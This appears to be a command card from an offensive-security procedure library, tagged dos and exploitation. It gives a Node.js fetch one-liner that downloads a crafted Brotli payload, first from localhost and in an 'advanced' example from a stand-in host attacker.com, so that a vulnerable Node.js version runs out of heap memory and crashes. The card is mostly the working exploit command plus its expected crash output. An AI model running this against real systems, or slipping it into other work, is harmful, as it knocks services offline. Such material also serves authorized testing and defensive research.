---
id: 123e4567-e89b-12d3-a456-426614174004
data: >-
  node --experimental-fetch -e
  "fetch('http://localhost:8080/malicious.br').then(r =>
  r.arrayBuffer()).then(buf => console.log('Decoded size:',
  buf.byteLength)).catch(e => console.error('Error:', e.message));"
name: run-vulnerable-fetch
tags:
  - dos
  - exploitation
  - node.js
type: command
output: null
executor: bash
platforms:
  - Node.js
created_at: '2024-10-04T00:00:00Z'
updated_at: '2025-12-14T17:26:48.704Z'
verified: false
validated: true
submitted: true
---
# run-vulnerable-fetch

## Command

```bash
node --experimental-fetch -e "fetch('http://localhost:8080/malicious.br').then(r => r.arrayBuffer()).then(buf => console.log('Decoded size:', buf.byteLength)).catch(e => console.error('Error:', e.message));"
```

## Description

Executes a Node.js one-liner to fetch and decode a Brotli payload, triggering memory exhaustion in vulnerable versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://localhost:8080/malicious.br` | URL to the Brotli payload | Yes |
| `--experimental-fetch` | Enables fetch() in older Node.js | No (required pre-v18) |

## Examples

### Basic Usage

```bash
node --experimental-fetch -e "fetch('http://example.com/file.br').then(r => r.text()).catch(console.error);"
```

### Advanced Usage

```bash
node --max-old-space-size=1024 -e "fetch('http://attacker.com/malicious.br').then(r => r.arrayBuffer());"
```

## Expected Output

Error: JavaScript heap out of memory or similar, with process termination. Monitor memory before crash.

## Related

- [[Related Procedure|procedures/Exploit-Brotli-Decoding-DoS-in-Node-js]]
